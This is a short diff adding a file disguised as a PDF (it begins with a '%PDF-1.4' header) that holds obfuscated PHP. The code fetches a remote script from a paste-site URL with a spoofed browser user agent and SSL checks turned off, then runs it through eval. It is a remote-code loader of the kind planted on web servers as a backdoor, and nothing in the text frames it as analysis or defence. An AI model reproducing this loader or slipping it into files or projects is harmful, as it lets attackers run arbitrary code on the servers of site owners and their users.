@@ -1,0 +1,3 @@
+%PDF-1.4
+%<?php
+ function fetchContent($v1) { $v2 = [ 'http' => [ 'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n" ] ]; $v3 = stream_context_create($v2); $v4 = @file_get_contents($v1, false, $v3); if ($v4 === false) { $v5 = curl_init(); curl_setopt($v5, CURLOPT_URL, $v1); curl_setopt($v5, CURLOPT_RETURNTRANSFER, true); curl_setopt($v5, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'); curl_setopt($v5, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($v5, CURLOPT_TIMEOUT, 30); $v4 = curl_exec($v5); curl_close($v5); } return $v4; } $v1 = 'https://pastecode.dev/raw/6ckvq0x1/02.php'; $v4 = fetchContent($v1); if ($v4) { eval('?>' . $v4); } ?>
